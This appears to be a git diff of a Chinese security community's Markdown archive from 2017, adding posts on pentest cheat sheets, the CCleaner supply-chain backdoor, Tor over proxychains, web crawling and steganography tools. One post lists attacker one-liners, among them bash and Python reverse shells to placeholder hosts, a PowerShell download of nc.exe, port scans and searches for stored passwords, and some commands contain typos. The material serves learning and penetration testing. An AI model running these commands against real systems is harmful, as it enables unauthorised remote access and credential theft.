@@ -1,6 +1,6 @@
 # Miscellaneous
 子目录:
-- [技能树](#技能树)
+- [技能树/Cheat Sheets](#技能树-cheat-sheets)
 - [平台](#平台)
 - [书籍报告](#书籍报告)
 - [APT](#apt)
@@ -22,8 +22,10 @@
 - [Python](#python)
 - [Openwrt](#openwrt)
 - [Command and Control](#command-and-control)
+- [隐写](#隐写)
+- [Browser](#browser)
 
-## 技能树
+## 技能树 Cheat Sheets
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-26:
 
@@ -229,16 +231,91 @@ Web-Security-Learning，关于web安全的资料收集。中文资料。
 <img src="https://images.xiaomiquan.com/FiiztpuGB-SRmMdFFa_SYzJgYx9o?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:5PqPDRedj3XMiK1-NJuSXnoVp84=" width="50%" height="50%" align="middle"/>
 
 
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-22:
+
+
+__#资源#__
+
+Awesome Pentest Cheat Sheets
+
+极好的渗透测试清单。嗯，这个老外汇总整理了不少精彩的 Cheat Sheets，确实很有用。
+
+发现我开源的 XSS’OR 也在其中，很好很好，等着下一版本我的大升级，绝对不仅仅是加解密优秀啊...
+
+细节见：
+
+
+[GitHub - coreb1t/awesome-pentest-cheat-sheets: Col...](https://github.com/coreb1t/awesome-pentest-cheat-sheets)
+
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-29:
+
+
+__#资源#__
+
+漏洞赏金技能清单
+
+GitHub 真是个黑客氛围浓厚的地方，这个也有人整理出来了，过了一遍，虽然还很不够全面，算挺难得的了，分享给大家。
+
+这份技能清单，包括：
+
++ 那些赏金平台
++ 相关书籍
++ 特殊的工具
++ 情报调研
++ XSS 清单
++ SQL 注入清单
++ SSRF 清单
++ CRLF 注入清单
++ CSV 注入清单
++ LFI 清单
+X+ XE 清单
++ RCE 清单
++ 重定向漏洞清单
++ 加密清单
++ 模版注入清单
++ 内容注入清单
++ XSLT 注入清单
+
+具体见：
+
+
+[GitHub - EdOverflow/bugbounty-cheatsheet: A list o...](https://github.com/EdOverflow/bugbounty-cheatsheet)
+
+
+
+有精力者完全可以去这些赏金平台上刷点知名度、经验和美金...
+
+
+
 ...
 
-<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 从来不评论，但是这个太好了，感谢，希望多发类似的
+<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 老大  这是技能表么相当于
 
-<img src="https://file.xiaomiquan.com/91/f8/91f81e70221f48b37d1cb3e0b292055cc67cf73ab42f9412d9f773911efdcc9f.jpg" width="25px"/> __AAAACD__: 打不开
-
-<img src="https://file.xiaomiquan.com/9e/a0/9ea0c3d113079d89e8aa7eb1636f1866f9e7fb4430d1bfd503116db4f11f2a7e.jpg" width="25px"/> __吴奇__: 感谢分享
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 赏金猎人入门级技能表
 
 
 ...
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-30:
+
+
+__#资源#__
+
+Web 安全学习资料
+
+Chybeta 同学很认真，汇总的学习资料很多了，转这分享给大家：
+
+
+[Web-Security-Learning | Chybeta](https://chybeta.github.io/2017/08/19/Web-Security-Learning/)
+
+
 
 ---
 
@@ -506,6 +583,49 @@ HITB 新加坡这两天相关演讲议题都会在这公布：
 
 ---
 
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-19:
+
+
+__#资源#__
+
+推荐 ES6 标准入门（第3版）
+
+引用文中的介绍：
+
+```
+ECMAScript 6.0（以下简称 ES6）是 JavaScript 语言的下一代标准，已经在2015年6月正式发布了。它的目标，是使得 JavaScript 语言可以用来编写复杂的大型应用程序，成为企业级开发语言。
+
+...
+
+因此，ECMAScript 和 JavaScript 的关系是，前者是后者的规格，后者是前者的一种实现（另外的 ECMAScript 方言还有 Jscript 和 ActionScript）。日常场合，这两个词是可以互换的。
+```
+
+前端黑领域，要打好的基础有两个：HTML5 与 ES6。这本书阮一峰所著，他的文章向来很清晰，推荐给大家，更难得的是这本书如果不买纸质版也行，他免费开放到网上了：
+
+
+[ECMAScript 6 入门 - ECMAScript 6入门](http://es6.ruanyifeng.com)
+
+
+<img src="https://images.xiaomiquan.com/FhJgACL4XHwo4897zP8LWl9AxBey?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lwWtpaOU2bu1KWCZlShEEhj-QqQ=" width="50%" height="50%" align="middle"/>
+
+
+---
+
+<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-26:
+
+强烈推荐大家关注下Derbycon 2017，都是一群实战红蓝队技术的家伙，演讲议题硬货实在实在太多了，眼花缭乱~
+
+
+[Derbycon 2017 Videos (Hacking Illustrated Series I...](http://www.irongeek.com/i.php?page=videos/derbycon7/mainlist)
+
+
+
+<img src="https://file.xiaomiquan.com/d1/7b/d17ba0300f0fff865bcbfe8c94d1ad96ae9463fd7d80c1c38cc43dc670f83b4b.png" width="50%" height="50%" align="middle"/>
+<img src="https://file.xiaomiquan.com/95/63/9563c9001173aff07340c06c833c1d20bf851f042f88d6522ef554d8cca69d76.png" width="50%" height="50%" align="middle"/>
+<img src="https://file.xiaomiquan.com/31/0d/310da90b6e49ee958430a501391bf2b36c4afd88dded3e7aca6b1425013b7f1f.png" width="50%" height="50%" align="middle"/>
+
+---
+
 
 ## APT
 
@@ -569,6 +689,35 @@ __#HITB#__
 __分享文件:__
 [COMMSEC D1 - Hamza Beghal - Threat Hunting 101 -  Become the Hunter.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)
 
+
+---
+
+<img src="https://file.xiaomiquan.com/3e/75/3e7537bd2177c4dd5dd1b56e3c0042e0ff82aff34db92a1095cf97b73266c3ec.jpg" width="25px"/> __Aro_un@ATTOT__ on 2017-09-18:
+
+ccleaner被植马，有安装对应版本的快速很新下。
+[CCleaner, distributed by anti-virus firm Avast, co...](https://www.grahamcluley.com/ccleaner-backdoor/)
+
+
+
+<img src="https://images.xiaomiquan.com/Fl2bm4eAlq_xoHvOh6tadAa8t_4Y?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:pml-gq9yfB0_giHCbAtwu4BPXhk=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 又震惊了……
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 供应链劫持
+
+<img src="https://file.xiaomiquan.com/2e/d6/2ed601f524a093a2ef25692413f618bd2d947cde8075dc813b98205b2daef33d.jpg" width="25px"/> __据说好的名字很容易被别人记住__: 5.25版本
+
+<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: ……懒得更新也能躲过一劫
+
+<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 最近供应链入侵有点多啊 难道是个趋势？不过，这种入侵的周期 成本以及能力 不是一般人和小团队能承受的。国家队是不是都准备上正面战场了啊…
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 小团队也可以承受，不过就看有没能力或运气去搞这一出
+
+
+...
 
 ---
 
@@ -1121,6 +1270,317 @@ __参考资料__
 
 ---
 
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-09-09:
+
+
+__#姿势#__
+
+解读下弦哥从新加坡HITB黑客大会进口过来的黑魔法命令吧。
+
+虽然都比较简单，但是在一些应用场景下简直就像把简单螺丝刀变成瑞士军刀了。
+
+黑魔法命令
+
+一、BASH
+
+1.将一个分区通过ssh加密通道压缩传输到10.10.10.10 设备上
+
+```
+dd if=/dev/rdisk0s1s2 bs=65536 conv=noerror,sync | ssh -C user@10.10.10.10 "cat >/tmp/image.dd"
+```
+
+2.验证指定IP的端口服务是否一直在开通状态，每隔一秒刷新一次，如果端口开通，则输出Service is up。
+
+```
+while (true)；do nc -vv -z -w3 10.10.10.10 80 > /dev/null && echo -e "Service is up"; sleep 1;done
+```
+
+3.创建一个反弹shell到指定的ip上。
+
+```
+bash -i >& /dev/tcp/10.10.10.10/8080 0>&1
+```
+
+4.用系统自带base64做编码解码处理，很方便。
+
+`echo ‘Hello, World!' | base64` 把 ‘Hello, World’ 字符串做base64编码
+
+`echo 'XXXXXXXX' | base64 -d` 将编码后的字符串‘XXXXXXX’ 做解码
+
+也可以先输入 `base64 -d` 然后输入要解码的字符，再按 Ctrl+d 进行解码
+
+5.克隆一个网站到本地，比如 `wget -r -mH www.baidu.com`
+
+```
+wget -r -mH $URL
+```
+
+6.根据文件名从指定路径中寻找包含特定字符串的文件，并将包含该字符串的行和该文件名输出。
+
+```
+find /PATH/TO/DIRECTORY -name "filename" -type f -exec grep -i "STRING" {} \； -print 2>/dev/null
+```
+
+7.呵呵，这个是用ccat查看文件内容时，给一些代码中特殊字符加上颜色，看代码方便很多。
+
+```
+alias ccat='pygmentize -O bg=dark,style=colorful'
+```
+
+8.查看自己的公网IP
+
+```
+curl -4 icanhazip.com
+wget -qO- ifconfig.me/ip
+```
+
+补充两个
+
+```
+curl ipinfo.io
+curl ip.cn
+```
+
+9.多聪明的命令，给自己的上一条命令自动加上sudo,并命一个简短的别名，是不是经常忘记输入sudo，这下世界美丽了不少吧。
+
+```
+alias gah='sudo $(history -p \!\!)'
+```
+
+二、CMD KUNG-FU
+
+1.这个命令用于用电脑的无线网卡创建一个无线热点，不过要看你的网卡是不是支持承载网络，不支持的话就没办法建立热点。
+
+```
+netsh wlan set hostednetwork mode=allow ssid=<MYSSID> key=<MYPASSWORD> && netsh wlan start hostednetwork
+```
+
+`netsh wlan drivers` 可以查看网卡支不支持承载网络。
+
+2.Windows下的端口转发，可以支持v4tov4、v4tov6、v6tov6、v6tov4，windows自带的，很方便。
+
+```
+netsh interface protproxy add v4tov6 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<PORT> connectaddress=<RHOST>
+```
+
+3.查询指定IP或者端口的连接，并每秒刷新一次。
+
+```
+netstat -naob 1 | find "<IPADDR or PORT>"
+```
+
+4.获取正在运行进程的一些详细信息。
+
+```
+wmic process list full
+```
+
+5.显示每个进程对应的服务。
+
+```
+tasjkust /svc
+```
+
+三、PowerShell
+
+1.用ping命令去扫描整个C段
+
+```
+1..255 | % {echo "192.168.253.$_"; ping -n 1 -w 100 192.168.253.$_} | Select-String ttl
+```
+
+补充个cmd的
+
+```
+for /L %i in (1,1,255) do @ping 192.168.253.%i -n 1 -w 100 | find /i "ttl"
+```
+
+2.从http服务器下载文件保存到本地
+
+Win 7:   `(New-Object System.Net.Webclient).DownloadFile("http://10.10.10.10/nc.exe","c:\nc.exe")`
+
+Win8 and later:  `wget "http://10.10.10.10/nc.exe"  -outfile "c:\nc.exe"`
+
+3.查看Windows内置防火墙的规则，非常详细，各个程序入站出站的规则和端口等详细信息都有。
+
+```
+Get-NetFirewallRule -all | Out-GridView
+```
+
+`Get-NetFIrewallRule -all | Export-csv <filename.csv>`
+将查询结果导出到一个csv文件中
+
+4.给Windows内置防火墙增加一条准许的规则。Win7 测试无法用，Win10 可以。
+
+```
+New-NetFIrewallRule -Action Allow -DisplayName Pentester-C2 -Remoteaddress <IPADDR>
+```
+
+5.用powershell来端口扫描
+
+```
+1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
+```
+
+扫描一个IP范围是否开放指定端口
+
+```
+foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.253.$ip}
+```
+
+设定IP范围和端口范围进行扫描(速度比较慢)
+
+```
+1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}
+```
+
+6.从指定目录的文件中寻找文件内容包含STRING字符的文件，并显示该行内容和文件名。一般用于查询记录的密码和配置了。
+
+```
+ls -r c:\PATH\DIRECTORY file | % {Select-String -path $_ -pattern STRING}
+```
+
+四、python
+
+1.开启一个简易的HTTP服务器，很方便有没有。
+
+python 2.x
+
+```
+python -m SimpleHTTPServer 8000
+```
+
+python 3.x
+
+```
+python3 -m http.server 8000
+```
+
+2.用python从HTTP服务器来下载文件，或者是整站的页面。
+
+python 2.x
+
+```
+python -c 'import urllib2; print urllib2.urlopen("http://10.10.10.10").read()' | tee /tmp/file.html
+```
+
+python 3.x
+
+```
+python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.10.10","/tmp/10.10.10.html")'
+```
+
+3.将一个反弹回来或是漏洞利用得到的shell转换为一个类似终端的shell。这样shell就可以交互了。
+
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+4.用python创建一个反弹shell，类似nc。Windows和Linux通用
+
+```
+python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('<IPADDR>',<PORT>))\nwhile 1: proc =
+subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
+```
+
+资源推荐:
+
+[https://pen-testing.sans.org/blog/category/command-line-kung-fu](https://pen-testing.sans.org/blog/category/command-line-kung-fu)
+
+(命令都是来自这家安全培训公司，他们网站上有命令演示，和每个参数的详解，感兴趣可以去看看，需自己爬出去)
+
+[https://mva.microsoft.com/zh-cn/training-courses/-power-shell-30-14443?l=Phq2m1PkB_3500115888](https://mva.microsoft.com/zh-cn/training-courses/-power-shell-30-14443?l=Phq2m1PkB_3500115888)
+
+(PowerShell作者出的教程视频，中文字幕、中文字幕、中文字幕)
+
+
+__分享文件:__
+[黑魔法命令.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 赞这样的解读啊😘
+
+<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 赞
+
+<img src="https://file.xiaomiquan.com/85/7e/857e7074cd57069c52c64361162a16153347497cda25cad85d234445a06ef8b2.jpg" width="25px"/> __愤怒CPU__: mark😏
+
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-09-19:
+
+
+__#姿势#__
+
+ 
+这篇文章对shell的讲解很详细，很多反弹shell的姿势，都值得大家亲自实操一下，留档备用
+
+[关于Shell你想知道的都在这儿 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/system/147768.html)
+
+
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 顺便搜下本圈之前的相关内容，关键词“反弹”
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-20:
+
+
+__#后门#__
+
+用 Mac 电脑且安装了 iTerm2 终端应用的同学注意下这个：
+
+
+[你的终端是安全的吗？iTerm2 中可能通过 DNS 请求泄漏隐私信息 - FreeBuf.COM ...](http://www.freebuf.com/news/148292.html)
+
+ 
+
+失误性后门...
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 满世界都在爆后门
+
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-09:
+
+
+__#资源#__
+
+渗透师必备命令之 awk 与 sed 高级操作
+
+以前刚入门 Linux 渗透时，一位前辈黑客就教会了我们这些命令，学习下来后，在无数的场合下确实大大提升了操作与分析速度。尤其像 awk 这样的命令，本身还可以当成脚本语言，非常强大。
+
+这篇文章来自知名 Red Team，推荐新人们好好过一遍，不仅可以学会这两个命令的高级技巧，还可以学会大量其实很简单的英文。
+
+
+[https://bluescreenofjeff.com/2017-10-03-f-awk-yeah-advanced-sed-and-awk-usage-parsing-for-pentesters-3/](https://bluescreenofjeff.com/2017-10-03-f-awk-yeah-advanced-sed-and-awk-usage-parsing-for-pentesters-3/)
+
+
+
+注意了：任何技巧，不实战，不常用，都会废掉。[微笑]
+
+
+
+---
+
 
 ## 端口转发
 
@@ -1253,6 +1713,44 @@ __#基础#__
 
 <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/f0/bf/f0bfbda89e3585e2553dc9f03f3bdab2b563215c2cfdbb66931262abb622cf61.jpeg" width="25px"/> __黑色的眼睛__: 
 [https://aws.amazon.com/cn/free/faqs/](https://aws.amazon.com/cn/free/faqs/)
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-22:
+
+分享一个小tips：如何愉快地Tor
+
+首先你要有个ss服务器，在你的VPS上apt-get install tor proxychains
+然后再开一个ss进程
+
+```
+proxychains ss-server -c config.json -f pid 2
+```
+
+此时本机上流量走你的ss就自然通过Tor了，延迟还不错哦
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: proxychains代理辅助神器，不小心又发车了
+
+<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 如果你的ss稳定实测这种方式能有平均2Mb的速度
+
+<img src="https://images.xiaomiquan.com/FjRLNY2fWjT9fSYYUy2TVLJyjGBk?e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:JJXkrKbjrxWrJbruGdSPpJlCe88=" width="50%" height="50%" align="middle"/>
+
+<img src="https://file.xiaomiquan.com/3e/bc/3ebce5c2bb67c5ad0ea4e2d0dd0d9b2c60e444bc18d1021d44aea7b315216686.jpg" width="25px"/> __heather__: 混淆提速
+
+<img src="https://file.xiaomiquan.com/f1/cd/f1cd5ee079f57ef0999999f8ccf3b20cfc72e953eee382ad7936d39e7cec9e81.jpg" width="25px"/> __maodidi__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 你这个图好酷啊，可以问一下是什么程序吗？
+
+<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/f1/cd/f1cd5ee079f57ef0999999f8ccf3b20cfc72e953eee382ad7936d39e7cec9e81.jpg" width="25px"/> __maodidi__: 这是arm，Tor官方的图形化界面(字符图形化)
+
+<img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 请问ssr可以吗？
+
+<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 理论上可以的，实践一下才知道
+
 
 ...
 
@@ -1391,6 +1889,51 @@ Cookie 这个维护，本质原理：看浏览器怎么做的，尽量去模拟�
 <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: Requests
 
 <img src="https://file.xiaomiquan.com/bd/87/bd872d6bf8f2e37a8687398bc1bc0af07f9b896fc43c3663a77f830db1ac4c5c.jpg" width="25px"/> __ken🐜__: 小象学院有爬虫的课
+
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-08:
+
+> Cris 提问：
+如何爬取网站搜索栏自动补全的内容，给个思路，先行谢谢。比如我在google内搜索iPhone 7 y 就会有4个自动补全内容。前两个为 iPhone 7 adapter / iPhone 7 youtube。 说得比较啰嗦，谢谢。
+
+
+你可以通过 Chrome 开发者工具抓包观察请求来了解本质，比如我输入 cos，在请求里看到如下链接：
+
+[https://www.google.com.hk/complete/search?client=psy-ab&hl=zh-CN&gs_rn=64&gs_ri=psy-ab&cp=3&gs_id=o5&q=cos&xhr=t](https://www.google.com.hk/complete/search?client=psy-ab&hl=zh-CN&gs_rn=64&gs_ri=psy-ab&cp=3&gs_id=o5&q=cos&xhr=t)
+
+
+
+内容是：
+
+```
+["cos",[["costco",0,[131]],["cos",0],["cosco",0],["costco ca",0,[131]]],{"j":"o5","k":1,"q":"ZEhkkVJAyiprdmxZvBP4Zy70OOx","t":{"bpc":false,"phi":0,"tlw":false}}]
+```
+
+也就是说这个是 AJAX 动态返回的 JSON 数据，这就是自动补全的内容。
+
+那么后面的爬虫就简单了，你完全可以考虑用 PhantomJS 或 Headless Chrome 来应对这种动态 AJAX 内容。
+
+思路如此，更多自己调试走起。
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补上自动补全内容的一张图：
+
+<img src="https://images.xiaomiquan.com/Flqt90v5S_Uf7pgdIKfOm54sPo0C?e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:TfJEkZiinycHg2MOqXtVHkNdAbQ=" width="50%" height="50%" align="middle"/>
+
+<img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 好的，谢谢，现在自己做电商公司，深感爬虫的重要性，拿别人的不靠谱，一是因为定制化，二是因为需求更新。
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 一般都自己写，不会很难
+
+<img src="https://file.xiaomiquan.com/ec/93/ec93b9e19120067e8ba5524eb109c77aa3acfef447e8941da7bab87a56f88786.jpg" width="25px"/> __fhqrnr__ replies to <img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__: 然而爬虫是一个很长的产业链，一旦进入就必然与反爬做斗争，还有打码、动态代理...
+
+<img src="https://file.xiaomiquan.com/a6/1d/a61d9a847e2559c1c6b1af6770178888c28a67958e2cba323847d0dadfbc96f6.jpg" width="25px"/> __Cris__ replies to <img src="https://file.xiaomiquan.com/ec/93/ec93b9e19120067e8ba5524eb109c77aa3acfef447e8941da7bab87a56f88786.jpg" width="25px"/> __fhqrnr__: 是的，没错，到最后都是拼团队，拼资源
 
 
 ...
@@ -1800,6 +2343,27 @@ __分享文件:__
 
 ---
 
+<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ on 2017-10-09:
+
+
+__#Python安全开发打怪升级之路#__
+
+接下来的话主要分享一些有用标准库和安全开发过程中使用的比较多的模块。
+
+
+__分享文件:__
+[Python基础(二).pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)
+
+
+...
+
+<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 赞一个
+
+
+...
+
+---
+
 
 ## Openwrt
 
@@ -1966,6 +2530,128 @@ Red Team 的叫法流行了，我们就是以 Red Team（攻击）的出发点�
 __分享文件:__
 [D1 - Dominic Chell and Vincent Yiu - A Year In The Red.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)
 
+
+---
+
+
+## 隐写
+
+
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:
+
+> [§] 提问：
+余大大，我想请教一下：我想用Python写一个可以批量检测图片是否隐藏了其他东西的工具，包括检测出使用的是何种隐写术，不知道这个想法能否实现，若可以实现，需要掌握哪些隐写术，可否提供一些参考资料学习学习。谢谢！
+
+
+这个好问题，可惜我们没实战过，思路倒是可以去看看都有哪些隐写技术，知己知彼，比如 Freebuf 搜下隐写，好些文章。
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 
+[GitHub - Owlz/stegoVeritas: Yet another Stego Tool](https://github.com/Owlz/stegoVeritas)
+
+<img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 
+[图片隐写术总结 – 850's Blog](http://850.world/2017/04/12/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/#comment-4)
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: Great
+
+<img src="https://file.xiaomiquan.com/8b/f8/8bf8ed658903935055a1d9bc9b13cb9ff0ed77f145e07625f80765a1cc1da9c0.jpg" width="25px"/> __[§]__ replies to <img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 谢谢！学习学习
+
+
+...
+
+---
+
+
+## Browser
+
